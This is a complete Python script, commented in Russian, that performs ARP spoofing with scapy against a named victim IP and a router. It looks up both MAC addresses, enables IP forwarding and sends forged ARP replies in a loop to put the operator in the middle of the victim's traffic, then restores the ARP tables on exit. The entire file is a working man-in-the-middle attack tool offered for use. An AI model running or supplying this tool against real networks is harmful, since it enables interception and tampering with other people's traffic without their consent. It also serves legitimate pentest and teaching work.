#!/usr/bin/env python3

from scapy.all import Ether, ARP, srp, sendp
import sys
import time
import os

def get_mac(ip):
    """
    Возвращает MAC-адрес для указанного IP-адреса, используя ARP-запрос.
    """
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    try:
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        print(f"[-] Ошибка: Не удалось найти MAC-адрес для {ip}. Хост не отвечает?")
        return None

def spoof(dest_ip, dest_mac, source_ip):
    """
    Отправляет один ложный ARP-ответ напрямую (unicast), чтобы избежать WARNING'ов.
    """
    # Создаем полный пакет: L2 (Ethernet) + L3 (ARP)
    # Ether(dst=dest_mac) - "конверт" с точным MAC-адресом получателя
    full_packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip)
    
    # Отправляем пакет на уровне L2
    sendp(full_packet, verbose=False)

def restore(dest_ip, dest_mac, source_ip, source_mac):
    """
    Восстанавливает ARP-таблицу, отправляя правильный пакет напрямую (unicast).
    """
    full_packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(full_packet, count=4, verbose=False)

# --- Главная часть программы ---

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Использование: sudo python3 arpSpoof_v3.py <ip-адрес_жертвы> <ip-адрес_маршрутизатора>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]
    
    # --- НОВЫЙ ИНТЕРАКТИВНЫЙ БЛОК ---
    known_macs = input("[?] MAC-адреса целей известны? (y/n): ").lower()

    if known_macs == 'y':
        victim_mac = input(f"    Введите MAC-адрес жертвы ({victim_ip}): ")
        router_mac = input(f"    Введите MAC-адрес роутера ({router_ip}): ")
        if not victim_mac or not router_mac:
            print("[!] MAC-адреса не могут быть пустыми. Выход.")
            sys.exit(1)
    else:
        print("[*] MAC-адреса неизвестны. Запускаем автоматическое определение...")
        victim_mac = get_mac(victim_ip)
        router_mac = get_mac(router_ip)

    if not victim_mac or not router_mac:
        print("[!] Не удалось получить MAC-адреса. Выход.")
        sys.exit(1)
    
    print(f"[*] MAC жертвы ({victim_ip}): {victim_mac}")
    print(f"[*] MAC роутера ({router_ip}): {router_mac}")
    
    print("[*] Включаем IP-пересылку...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    sent_packets_count = 0
    try:
        print("[*] Запуск ARP-спуфинга... Нажмите Ctrl+C для выхода.")
        while True:
            spoof(victim_ip, victim_mac, router_ip)
            spoof(router_ip, router_mac, victim_ip)
            
            sent_packets_count += 2
            print(f"\r[+] Отправлено пакетов: {sent_packets_count}", end="")
            sys.stdout.flush()
            time.sleep(2) 

    except KeyboardInterrupt:
        print("\n[*] Обнаружено нажатие Ctrl+C... Восстанавливаем ARP-таблицы...")
        restore(victim_ip, victim_mac, router_ip, router_mac)
        restore(router_ip, router_mac, victim_ip, victim_mac)
        
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[+] ARP-таблицы восстановлены. Выход.")
